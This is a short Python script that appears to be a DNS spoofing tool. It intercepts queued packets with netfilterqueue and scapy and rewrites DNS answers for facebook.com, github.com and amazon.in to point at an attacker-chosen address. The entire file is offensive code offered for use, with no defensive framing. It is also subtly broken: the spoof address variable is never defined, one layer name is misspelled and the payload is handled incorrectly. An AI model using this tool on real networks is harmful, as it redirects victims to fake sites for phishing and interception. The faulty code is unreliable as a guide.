#!/usr/bin/env python
import netfilterqueue as netq
import scapy.all as scapy

def see_packet(packet):
    use_packet = scapy.IP(packet.get_payload())
    if use_packet.haslayer(scapy.DNSRR):
        request_url = use_packet[scapy.DNSQR].qname
        urls = ["facebook.com", "github.com", "amazon.in"]
        for url in urls:
            if url in request_url:
                response = scapy.DNSRR(rrname=request_url, rdata=[spoof_ip])
                use_packet[scapy.DSN].an = response

                use_packet[scapy.DNS].ancount = 1
                del use_packet[scapy.IP].len
                del use_packet[scapy.IP].chksum
                del use_packet[scapy.UDP].len
                del use_packet[scapy.UDP].chksum

                packet.set_payload(str(use_packet))
    packet.accept()

queue = netq.NetfilterQueue()
queue.bind(0, see_packet)
queue.run()